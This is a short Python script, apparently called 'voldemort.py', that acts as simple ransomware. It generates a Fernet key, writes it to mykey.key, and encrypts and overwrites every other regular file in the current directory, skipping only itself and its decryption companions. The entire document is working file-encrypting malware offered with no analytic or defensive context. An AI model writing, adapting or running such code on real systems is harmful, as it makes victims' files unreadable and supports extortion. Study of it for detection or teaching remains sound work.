from importlib.resources import contents
import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
    if file == "voldemort.py" or file =="mykey.key" or file == "decrypt.py" or file == "decrypt.exe" or file == "voldemort.exe" :
        continue
    if os.path.isfile(file):
        files.append(file)

print(files)

key = Fernet.generate_key()

with open("mykey.key", "wb") as mykey:
    mykey.write(key)

for file in files:
    with open(file, "rb") as myfiles:
        contents = myfiles.read()
    contents_encrypted = Fernet(key).encrypt(contents)

    with open(file, "wb") as myfiles:
        myfiles.write(contents_encrypted)

print("Files encrypted successfully !!")
exit = input("Press any key continue..")